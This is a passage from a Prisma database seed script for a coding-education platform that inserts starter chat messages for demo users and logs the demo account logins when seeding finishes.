      prisma.user.findUniqueOrThrow({ where: { email: 'student@codeforge.dev' } }),
    ]);
    await prisma.chatMessage.createMany({
      data: [
        { room: 'general', userId: admin.id, content: 'Welcome to the Kodstigen community chat! 👋 Be kind, help each other, and keep it friendly.' },
        { room: 'general', userId: instructor.id, content: 'Hi everyone! I teach the backend courses here, ask me anything about Node.js or Express.' },
        { room: 'general', userId: student.id, content: 'Just passed my first Python quiz 🐍🔥' },
        { room: 'help', userId: instructor.id, content: 'Stuck on a lesson or challenge? Post it here with the error message and someone will help.' },
        { room: 'showcase', userId: admin.id, content: 'Finished a course project? Share a link or screenshot here, we love seeing what you build! 🚀' },
      ],
    });
    console.log('  ✓ starter chat messages');
  }

  console.log('Seed complete.');
  console.log('Demo accounts: student@codeforge.dev / student123, instructor@codeforge.dev / instructor123, admin@codeforge.dev / admin123');
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(() => prisma.$disconnect());
